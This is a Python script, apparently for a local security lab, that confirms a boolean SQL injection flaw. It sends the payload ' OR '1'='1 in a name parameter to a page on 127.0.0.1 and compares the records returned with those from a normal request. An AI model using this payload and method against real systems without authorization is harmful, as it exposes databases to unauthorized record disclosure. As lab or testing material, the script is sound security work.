#!/usr/bin/env python3
import http.client
import re
import html
from urllib.parse import quote

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"


def fetch(name: str):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    try:
        path = PATH + "?name=" + quote(name, safe="")
        conn.request("GET", path, headers={"Host": f"{HOST}:{PORT}"})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        status = resp.status
    finally:
        conn.close()
    return status, body


def parse_records(body: str):
    # 匹配 <p>ID 1：Alice</p>，冒号为全角“：”
    pattern = re.compile(r"<p>\s*ID\s+(\d+)\s*：\s*([^<]*)</p>", re.I)
    return {(m.group(1), html.unescape(m.group(2).strip())) for m in pattern.finditer(body)}


def main():
    normal_name = "Alice"
    test_name = "' OR '1'='1"

    normal_status, normal_body = fetch(normal_name)
    test_status, test_body = fetch(test_name)

    if normal_status != 200 or test_status != 200:
        raise SystemExit(f"HTTP 状态非 200：normal={normal_status}, test={test_status}")

    normal_records = parse_records(normal_body)
    test_records = parse_records(test_body)

    print("normal records:", sorted(normal_records))
    print("test records:", sorted(test_records))

    expected_normal = {("1", "Alice")}
    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}

    if normal_records != expected_normal:
        raise SystemExit(
            "普通业务对照失败：预期恰好 {('1','Alice')}。"
            "请检查服务、数据库连接和 lab_people 预置数据；不能据此判定 SQL 注入。"
        )

    if test_records == expected_test:
        print("VULNERABLE CONFIRMED：布尔注入返回了全部业务记录。")
    elif test_records == expected_normal:
        print("NOT CONFIRMED：测试请求与普通请求返回相同记录集合，请检查引号、数据库状态或错误输出。")
    else:
        raise SystemExit(
            f"测试记录集合异常：{sorted(test_records)}。"
            "请检查页面输出和数据库上下文后再判断。"
        )


if __name__ == "__main__":
    main()
